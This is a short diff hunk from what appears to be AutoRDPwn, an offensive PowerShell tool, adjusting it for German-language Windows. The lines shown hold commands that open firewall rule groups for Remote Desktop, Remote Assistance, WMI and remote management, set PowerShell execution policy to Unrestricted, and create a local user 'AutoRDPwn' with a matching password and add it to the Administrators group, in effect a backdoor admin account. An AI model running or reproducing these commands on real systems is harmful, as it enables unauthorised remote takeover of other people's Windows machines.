@@ -78,5 +78,5 @@ $Pwn1  = "Set-NetConnectionProfile -InterfaceAlias 'Ethernet *' -NetworkCategory
 $Pwn2  = "netsh advfirewall firewall set rule group = 'Remoteunterstützung' new enable = Yes; netsh advfirewall firewall set rule group='Remotedesktop' new enable=yes ; Set-ExecutionPolicy Unrestricted -Force"
 $Pwn3  = "netsh advfirewall firewall set rule group = 'Netzwerkerkennung' new enable = Yes; netsh advfirewall firewall set rule group = 'Remote-Verwaltung geplanter Aufgaben' new enable = yes"
 $Pwn4  = "netsh advfirewall firewall set rule group = 'Windows-Verwaltungsinstrumentation (WMI)' new enable = yes; netsh advfirewall firewall set rule group = 'Windows-Remoteverwaltung' new enable = yes"
-$Pwn5  = "net user AutoRDPwn AutoRDPwn /add ; net localgroup Administrators AutoRDPwn /add"
+$Pwn5  = "net user AutoRDPwn AutoRDPwn /add ; net localgroup Administratoren AutoRDPwn /add"
 $Pwn6  = "RDP-Sitzungsagent"
